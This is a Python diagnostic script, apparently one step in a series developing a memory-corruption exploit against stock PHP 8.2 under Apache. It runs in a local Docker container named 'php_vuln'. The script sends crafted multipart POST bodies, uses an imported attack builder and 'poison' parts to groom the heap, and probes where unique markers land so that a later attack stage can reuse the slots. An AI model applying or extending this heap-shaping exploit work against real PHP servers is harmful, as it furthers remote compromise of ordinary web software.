#!/usr/bin/env python3
"""oom120diag: where do successive same-shaped small-value posts land?

Question (from oom119c): post#1's part-13 256B value left a stale
marker at 0x…61a0; posts #2..#4 (identical shape, marker at different
OFF) did NOT show a second hit -> their values did NOT reuse post#1's
slot. This diagnostic maps the allocation addresses of 6 successive
same-shaped posts, each with a UNIQUE marker (MK0..MK5), probed right
after posting. Context-aware probe distinguishes real markers
(0202-tile context) from probe self-copies (malloc-meta context).

Also maps: does post N+1's marker address depend on post N's leftover?
Outcome feeds oom121's arm design (first-slot vs chained reuse).
"""
import re, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
SKIP16 = b"\x02" * 16
STRIDE = 3584
PART = 13
K1 = 4200
NCELL = 4
V256 = 16
BASEM = b"MARKBASE7"          # 9B; padded to 24 below


def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__


def sh(cmd, timeout=60):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()


def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8081:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False


def post_mod(body, timeout=240):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__


def mk_marker(n):
    """24B unique marker, NUL-free: MARKn + QMARK7XY filler."""
    m = (b"MARK%02dXYQ" % n) + b"QMARK7XY" + b"QMARK7XY"
    return m[:24]


def probe_hits(needle):
    """All hits with 16B pre-context; flag ctx=0202-pure as REAL."""
    code, out = get("%s/oom_probe.php?h=%s&chunk=262144&maxc=8" % (HOST, needle.hex()))
    hits = []
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("R="):
            continue
        for tok in re.findall(r"([0-9a-f]+)@ctx([0-9a-f]*)", line):
            addr = int(tok[0], 16)
            ctx = bytes.fromhex(tok[1]) if tok[1] else b""
            real = len(ctx) == 16 and ctx == SKIP16
            hits.append((addr, real, ctx.hex()))
    return hits


def marker_body(n):
    """Same-shaped marker post: names 0x02-skip, values 64B skip, part13 256B w/ marker@8."""
    t = bytearray(SKIP16 * V256)
    t[8:32] = mk_marker(n)
    p13 = bytes(t)
    ps = []
    for i in range(K1):
        head = (b'--BOUND\r\nContent-Disposition: form-data; name="'
                + SKIP16 * 190 + b"%d" % i + b'[x]"\r\n\r\n')
        val = p13 if i == PART else SKIP16 * NCELL
        ps.append(head + val + b"\r\n")
    ps += [P.poison_part(k, 5000000 + k * P.CELLS) for k in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


print("=== oom120diag: slot-allocation map for 6 same-shaped marker posts ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == STOCK_MD5, "not stock: %s" % md5
print("md5 ok; shaping (98-era, no crash needed)", flush=True)
for k1 in P.K1S[:-1]:
    post_mod(P.build_attack(k1, 5000000))

for n in range(6):
    body = marker_body(n)
    c, _r = post_mod(body)
    time.sleep(0.5)
    hits = probe_hits(mk_marker(n))
    reals = [h for h in hits if h[1]]
    print("post%d: %s real=%s all=%s"
          % (n, c, ["0x%x" % h[0] for h in reals],
             [(hex(h[0]), h[2][:16]) for h in hits if not h[1]][:3]), flush=True)

# second sweep: same markers again (do repeats reuse their own slots?)
print("--- repeat sweep ---", flush=True)
for n in range(6):
    c, _r = post_mod(marker_body(n))
    time.sleep(0.5)
    hits = probe_hits(mk_marker(n))
    reals = [h for h in hits if h[1]]
    print("rep%d: %s real=%s" % (n, c, ["0x%x" % h[0] for h in reals]), flush=True)
print("=== done ===", flush=True)
